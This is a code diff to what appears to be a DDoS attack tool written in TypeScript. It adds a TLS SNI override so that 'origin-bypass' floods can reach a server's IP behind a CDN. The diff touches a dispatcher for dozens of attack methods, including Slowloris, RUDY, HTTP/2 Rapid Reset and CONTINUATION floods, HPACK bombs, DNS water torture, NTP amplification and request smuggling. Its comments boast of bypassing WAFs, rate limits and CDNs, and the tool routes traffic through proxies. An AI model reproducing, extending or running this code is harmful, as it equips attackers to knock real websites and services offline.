@@ -106,6 +106,7 @@ interface WorkerConfig {
   port:     number;
   threads:  number;    // this worker's share of total threads
   proxies?: ProxyConfig[];
+  sni?:     string;    // optional override for TLS SNI (used by origin-bypass to keep original hostname)
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────
@@ -5953,6 +5954,11 @@ try {
   targetPort = parseInt(u.port, 10) || cfg.port || (u.protocol === "https:" ? 443 : 80);
 } catch { /* keep raw */ }
 
+// SNI for TLS connections — use explicit override when target is an IP (origin-bypass).
+// When cfg.sni is set (e.g. origin-bypass passes original hostname), use it.
+// Otherwise fall back to hostname (domain targets). RFC 6066: SNI must not be an IP.
+const sniName: string = cfg.sni ?? hostname;
+
 const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
 const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };
 
@@ -7487,27 +7493,27 @@ async function runWorker() {
     const tcpT  = Math.ceil(cfg.threads * 0.10);
     const udpT  = Math.max(1, cfg.threads - pipeT - wafT - rstT - tcpT);
     await Promise.all([
-      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, cfg.proxies ?? [], ctrl.signal, onStats),
+      runHTTPPipeline(resolvedHost, sniName, targetPort, pipeT, cfg.proxies ?? [], ctrl.signal, onStats),
       runWAFBypass(base, wafT, cfg.proxies ?? [], ctrl.signal, onStats),
-      runH2RstBurst(resolvedHost, hostname, targetPort, rstT, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2RstBurst(resolvedHost, sniName, targetPort, rstT, ctrl.signal, onStats, cfg.proxies ?? []),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
       runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats, resolvedHost6),
     ]);
 
   } else if (cfg.method === "http2-flood") {
     // Native HTTP/2 with multiplexed streams (node:http2)
-    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runHTTP2Flood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "slowloris") {
     // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
     const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
-    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats, isHttps);
+    await runSlowlorisReal(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats, isHttps);
 
   } else if (cfg.method === "conn-flood") {
     // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
     // Bypasses nginx rate limiting completely (limit_req never triggered)
     const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
-    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps, cfg.proxies ?? []);
+    await runConnFlood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, isHttps, cfg.proxies ?? []);
 
   } else if (cfg.method === "rudy") {
     // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
@@ -7528,20 +7534,20 @@ async function runWorker() {
     if (proxies.length > 0) {
       await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
     } else {
-      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, proxies, ctrl.signal, onStats);
+      await runHTTPPipeline(resolvedHost, sniName, targetPort, cfg.threads, proxies, ctrl.signal, onStats);
     }
 
   } else if (cfg.method === "http2-continuation") {
     // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
-    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2Continuation(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "tls-renego") {
     // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
-    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runTLSRenego(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "ws-flood") {
     // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
-    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runWSFlood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "graphql-dos") {
     // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
@@ -7558,19 +7564,19 @@ async function runWorker() {
 
   } else if (cfg.method === "rudy-v2") {
     // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
-    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runRUDYv2(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "ssl-death") {
     // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
-    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runSSLDeathRecord(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "hpack-bomb") {
     // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
-    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runHPACKBomb(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h2-settings-storm") {
     // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
-    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2SettingsStorm(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "icmp-flood") {
     // ICMP Flood — real ICMP echo request flood (Tier 1: raw-socket, Tier 2: hping3, Tier 3: UDP saturation)
@@ -7579,7 +7585,7 @@ async function runWorker() {
   } else if (cfg.method === "dns-amp") {
     // DNS Water Torture — floods target NS servers with random subdomain queries
     // Bypasses CDN/WAF, forces recursive resolution, fills NXDOMAIN cache
-    await runDNSWaterTorture(resolvedHost, hostname, cfg.threads, ctrl.signal, onStats);
+    await runDNSWaterTorture(resolvedHost, sniName, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "ntp-amp") {
     // NTP Flood — real NTP mode 7 monlist + mode 3 client requests to port 123
@@ -7599,7 +7605,7 @@ async function runWorker() {
 
   } else if (cfg.method === "slow-read") {
     // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
-    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runSlowRead(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "range-flood") {
     // HTTP Range Flood — Range: bytes=0-0,...,499-499 forces 500× server I/O per request
@@ -7611,11 +7617,11 @@ async function runWorker() {
 
   } else if (cfg.method === "h2-ping-storm") {
     // H2 PING Storm — thousands of PING frames/s per connection, server must ACK every one
-    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runH2PingStorm(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http-smuggling") {
     // HTTP Request Smuggling — TE/CL desync to poison backend request queue
-    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runHTTPSmuggling(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "doh-flood") {
     // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
@@ -7623,7 +7629,7 @@ async function runWorker() {
 
   } else if (cfg.method === "keepalive-exhaust") {
     // Keepalive Exhaust — pipeline 256 requests per keep-alive connection, holds worker threads
-    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runKeepaliveExhaust(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "app-smart-flood") {
     // App Smart Flood — POST to /login /search /checkout forcing DB queries, uncacheable
@@ -7631,23 +7637,23 @@ async function runWorker() {
 
   } else if (cfg.method === "large-header-bomb") {
     // Large Header Bomb — 32KB randomized headers exhaust HTTP parser allocator
-    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runLargeHeaderBomb(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "http2-priority-storm") {
     // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
-    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runH2PriorityStorm(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "h2-rst-burst") {
     // H2 RST Burst — CVE-2023-44487 dedicated: HEADERS+RST_STREAM pairs, pure write-path overload
-    await runH2RstBurst(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2RstBurst(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "grpc-flood") {
     // gRPC Flood — HTTP/2 application/grpc content-type, exhausts gRPC handler thread pool
-    await runGRPCFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runGRPCFlood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "tls-session-exhaust") {
     // TLS Session Cache Exhaustion — full handshake per connection, no resumption, saturates crypto thread pool
-    await runTLSSessionExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runTLSSessionExhaust(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "cache-buster") {
     // HTTP Cache Busting — unique params + Vary headers force 100% CDN cache miss, all hits go to origin
@@ -7659,21 +7665,21 @@ async function runWorker() {
 
   } else if (cfg.method === "bypass-storm") {
     // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST + RapidReset → App + Cache
-    await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runBypassStorm(base, resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "geass-ultima") {
     // Geass Ultima — Final Form: 9 simultaneous vectors across every OSI layer
-    await runGeassUltima(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runGeassUltima(base, resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "h2-dep-bomb") {
     // H2 Priority Tree Dependency Bomb — O(N²) server work per O(N) frames sent
     // RFC 7540 §5.3.1 exclusive PRIORITY chains + cascade RST → tree rebalancing amplification
-    await runH2DepBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2DepBomb(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h2-data-flood") {
     // H2 DATA Frame + Flow Control Exhaustion — fills server body buffers indefinitely
     // 100 streams × 4 rounds × 16KB frames = 26MB RAM consumed per connection slot
-    await runH2DataFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2DataFlood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h2-storm") {
     // H2 Storm — 6 simultaneous HTTP/2 attack vectors flooding all server H2 processing paths:
@@ -7687,33 +7693,33 @@ async function runWorker() {
     const t6  = Math.max(1, Math.floor(cfg.threads / 6));
     const rem = Math.max(1, cfg.threads - t6 * 5);
     await Promise.all([
-      runH2SettingsStorm(resolvedHost, hostname, targetPort, rem, ctrl.signal, onStats, cfg.proxies ?? []),
-      runHPACKBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
-      runH2PingStorm(resolvedHost, hostname, targetPort, t6, cfg.proxies ?? [], ctrl.signal, onStats),
-      runH2Continuation(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
-      runH2DepBomb(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
-      runH2DataFlood(resolvedHost, hostname, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2SettingsStorm(resolvedHost, sniName, targetPort, rem, ctrl.signal, onStats, cfg.proxies ?? []),
+      runHPACKBomb(resolvedHost, sniName, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2PingStorm(resolvedHost, sniName, targetPort, t6, cfg.proxies ?? [], ctrl.signal, onStats),
+      runH2Continuation(resolvedHost, sniName, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2DepBomb(resolvedHost, sniName, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
+      runH2DataFlood(resolvedHost, sniName, targetPort, t6, ctrl.signal, onStats, cfg.proxies ?? []),
     ]);
 
   } else if (cfg.method === "pipeline-flood") {
     // HTTP Pipeline Flood — raw TCP pipelining at maximum RPS
-    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runHTTPPipeline(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else if (cfg.method === "rapid-reset") {
     // CVE-2023-44487 Ultra — 2000 streams/burst, single write(), Chrome 136 AKAMAI fingerprint
-    await runRapidResetUltra(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runRapidResetUltra(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "ws-compression-bomb") {
     // WebSocket permessage-deflate bomb — 64KB payload compressed to 36 bytes, 1820× amplification
-    await runWSCompressionBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runWSCompressionBomb(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h2-goaway-loop") {
     // H2 GOAWAY Loop — TLS+H2 teardown/setup cycle exhaustion, 5000 cycles/s
-    await runH2GoawayLoop(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runH2GoawayLoop(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "sse-exhaust") {
     // SSE Exhaust — holds 18K Server-Sent Events connections open indefinitely
-    await runSSEExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+    await runSSEExhaust(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
 
   } else if (cfg.method === "h3-rapid-reset") {
     // H3 Rapid Reset — CVE-2023-44487 ported to QUIC/HTTP3 over UDP (4-phase: Initial+0-RTT+RST+VN)
@@ -7722,7 +7728,7 @@ async function runWorker() {
 
   } else {
     // Default fallback: raw TCP pipeline
-    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+    await runHTTPPipeline(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
   }
 }
 
